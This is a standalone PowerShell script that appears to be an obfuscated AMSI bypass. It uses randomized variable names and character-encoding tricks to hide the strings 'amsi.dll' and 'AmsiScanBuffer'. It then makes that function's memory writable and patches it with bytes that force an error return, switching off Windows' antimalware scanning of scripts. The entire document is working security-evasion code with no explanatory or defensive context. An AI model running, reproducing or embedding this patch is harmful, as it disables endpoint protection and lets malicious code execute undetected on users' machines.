$l9tX7Ib_M8YUFt7 = @"
using System;
using System.Runtime.InteropServices;
public class l9tX7Ib_M8YUFt7 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr rRsE06l8WpmLO97d, string kiB);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr DRL, UIntPtr Gkd6Uz3eb733rt_hM_, uint kzCnD9BmnsduI6E_j, out uint XN3pC);
}
"@

Add-Type $l9tX7Ib_M8YUFt7

$PBHMRCJ = [l9tX7Ib_M8YUFt7]::LoadLibrary("$(('ãmsì'+'.dll').nOrMalIZe([ChaR]([byte]0x46)+[CHAr]([BYte]0x6f)+[CHar]([byte]0x72)+[CHAR](109+5-5)+[ChaR]([BYTE]0x44)) -replace [cHaR]([bytE]0x5c)+[ChAR]([bYTE]0x70)+[Char]([bytE]0x7b)+[chAr]([BytE]0x4d)+[CHar]([BytE]0x6e)+[char](125))")
$N1deotKKhWt = [l9tX7Ib_M8YUFt7]::GetProcAddress($PBHMRCJ, "$(('ÃmsíSc'+'ãnBûff'+'ér').NOrmaLIZE([CHAR](70*52/52)+[chAR](111*68/68)+[CHaR](114*96/96)+[CHaR](34+75)+[ChaR]([BYtE]0x44)) -replace [cHAr]([BytE]0x5c)+[chAr](112)+[ChaR](123+66-66)+[CHaR]([ByTe]0x4d)+[cHAr]([BYTe]0x6e)+[cHar](125*101/101))")
$p = 0
[l9tX7Ib_M8YUFt7]::VirtualProtect($N1deotKKhWt, [uint32]5, 0x40, [ref]$p)
$qrZidbhxVzW = "0xB8"
$AFDQJtawmEz = "0x57"
$nkt1w99SWYn3 = "0x00"
$gf0Di = "0x07"
$SGynsfzhKodAfwt = "0x80"
$pAXTidhqjB4oV5kAV = "0xC3"
$pGItY3 = [Byte[]] ($qrZidbhxVzW,$AFDQJtawmEz,$nkt1w99SWYn3,$gf0Di,+$SGynsfzhKodAfwt,+$pAXTidhqjB4oV5kAV)
[System.Runtime.InteropServices.Marshal]::Copy($pGItY3, 0, $N1deotKKhWt, 6)